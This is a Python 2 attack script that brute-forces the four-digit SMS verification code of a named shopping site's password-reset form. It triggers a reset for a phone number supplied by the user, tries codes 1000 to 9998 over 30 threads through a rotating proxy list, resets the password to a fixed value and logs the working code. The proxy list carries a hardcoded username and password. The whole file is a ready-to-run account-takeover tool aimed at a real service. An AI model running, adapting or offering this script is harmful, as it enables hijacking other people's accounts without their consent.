#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150322


import json
import random
import requests
import threadpool as tp
import sys
from BeautifulSoup import BeautifulSoup 
import types


global phone,cookie,formhash


def forgetpassword(phone):
    cookies = {'PHPSESSID':cookie}
    headers = {'content-type':'application/x-www-form-urlencoded',
               'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
               'Referer':'http://mall.dding.net/ucenter/forget',
        }
    api_url = 'http://mall.dding.net/ucenter/forget'
    try:
        req_g = requests.get(api_url,headers=headers,cookies = cookies,timeout=3)
        html = req_g.text
        soup=BeautifulSoup(html)
        formhash = soup.find('input',attrs = {'name':"formhash"})["value"]
        print "formhash:%s" % formhash
        data = {'cellphone':phone,
        'formhash':formhash,
        }
        req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
        req_status = req.status_code
        print "phone:%s sms code send" % phone[:8]
        return formhash
    except:
        req_status = 500
    #if req_status == 302:
        #print "phone:%s sms code send" % phone[:8]
        
    #elif req_status == 200:
    #    print "faild send sms code at phone:%s,cookie:%s" % (phone[:8],cookie)
    #    sys.exit(1)


def step(args):
    key = args
    password="12345600"
    data2 = {'valicode':key,
    'formhash':formhash,
    }
    cookies = {'PHPSESSID':cookie}
    headers2 = {'content-type':'application/x-www-form-urlencoded',
                    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
                    'Referer':'http://mall.dding.net/ucenter/forget/step2',
        }
    proxies = {
   "http":"http://webapp:webapp479@180.97.196.2:3002/",
   "http":"http://webapp:webapp479@180.97.196.3:3003/",
   "http":"http://webapp:webapp479@180.97.196.4:3004/",
   "http":"http://webapp:webapp479@180.97.196.5:3005/",
   "http":"http://webapp:webapp479@180.97.196.6:3006/",
   "http":"http://webapp:webapp479@180.97.196.7:3007/",
   "http":"http://webapp:webapp479@180.97.196.8:3008/",
   "http":"http://webapp:webapp479@180.97.196.9:3009/",
   "http":"http://webapp:webapp479@180.97.196.10:3010/",
   "http":"http://webapp:webapp479@180.97.196.11:3011/",
   "http":"http://webapp:webapp479@180.97.196.12:3012/",
   "http":"http://webapp:webapp479@180.97.196.13:3013/",
   "http":"http://webapp:webapp479@180.97.196.14:3014/",
   "http":"http://webapp:webapp479@180.97.196.15:3015/",
   "http":"http://webapp:webapp479@180.97.196.16:3016/",
   "http":"http://webapp:webapp479@180.97.196.17:3017/",
   "http":"http://webapp:webapp479@180.97.196.18:3018/",
   "http":"http://webapp:webapp479@180.97.196.19:3019/",
   "http":"http://webapp:webapp479@180.97.196.20:3020/",
   "http":"http://webapp:webapp479@180.97.196.21:3021/",
   "http":"http://webapp:webapp479@180.97.196.22:3022/",
   "http":"http://webapp:webapp479@180.97.196.23:3023/",
   "http":"http://webapp:webapp479@180.97.196.24:3024/",
   "http":"http://webapp:webapp479@180.97.196.25:3025/",
   "http":"http://webapp:webapp479@180.97.196.26:3026/",
   "http":"http://webapp:webapp479@180.97.196.27:3027/",
   "http":"http://webapp:webapp479@180.97.196.28:3028/",
   "http":"http://webapp:webapp479@180.97.196.29:3029/",
   "http":"http://webapp:webapp479@180.97.196.30:3030/",
   "http":"http://webapp:webapp479@180.97.196.31:3031/",
   "http":"http://webapp:webapp479@180.97.196.32:3032/",
   "http":"http://webapp:webapp479@180.97.196.33:3033/",
   "http":"http://webapp:webapp479@180.97.196.34:3034/",
   "http":"http://webapp:webapp479@180.97.196.35:3035/",
   "http":"http://webapp:webapp479@180.97.196.36:3036/",
   "http":"http://webapp:webapp479@180.97.196.37:3037/",
   "http":"http://webapp:webapp479@180.97.196.38:3038/",
   "http":"http://webapp:webapp479@180.97.196.39:3039/",
   "http":"http://webapp:webapp479@180.97.196.40:3040/",
   "http":"http://webapp:webapp479@180.97.196.41:3041/",
    }
    api_url2 = 'http://mall.dding.net/ucenter/forget/step2'
    try:
        req = requests.post(api_url2, data=data2, headers=headers2,cookies = cookies,proxies=proxies,timeout=3)
        req_status = req.status_code
        #print "move the step3" 
        data3 = {'password':password,
        'repassword':password,
        'formhash':formhash,
        }
        headers3 = {'content-type':'application/x-www-form-urlencoded',
                    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
                    'Referer':'http://mall.dding.net/ucenter/forget/step3',
        }
        api_url3 = 'http://mall.dding.net/ucenter/forget/step3'
        try:
            req = requests.post(api_url3, data=data3, headers=headers3,cookies = cookies,proxies=proxies,timeout=3)
            req_status = req.status_code
            html = req.text
            soup=BeautifulSoup(html)
            #<div class="alert alert-danger">failed for this action</div>
            result = soup.find('div',attrs = {'class':"alert alert-danger"})

            if type(result) is types.NoneType:
                print "phone done:%s,password:%s" % (phone,password)
                burp_succ = open('./web_succ.txt', 'a+')
                burp_succ.write('[-] Burp succ log:%s,code:%s\n'%(req_status,key))
                burp_succ.close()
                sys.exit(1)
            else:
                burp_fail = open('./web_log.txt', 'a+')
                burp_fail.write('[-] Burp False log:%s,code:%s\n'%(req_status,key))
                burp_fail.close()    
            
        except requests.RequestException as e:
            req_status = 500
            print "error at step3:%s" % e
    except requests.RequestException as e:
        req_status = 500
        print "error at step2:%s" % e

def get_cookie():
    api_url = 'http://mall.dding.net/'
    try:
        req = requests.get(api_url,timeout=3)
        req_status = req.status_code
        cook = req.cookies['PHPSESSID']
    except:
        req_status = 500
        sys.exit(1)
    if req_status == 200:
        print "get cookie:%s" % cook
        return cook

if __name__ == '__main__':
    args = []
    if len(sys.argv) != 2:
        print "usage: %s phone" % sys.argv[0]
        sys.exit(1)
    cookie=get_cookie()
    phone = sys.argv[1]
    formhash=forgetpassword(phone)
    for i in range(1000,9999):
        args.append(i)
    pool = tp.ThreadPool(30)
    reqs = tp.makeRequests(step, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
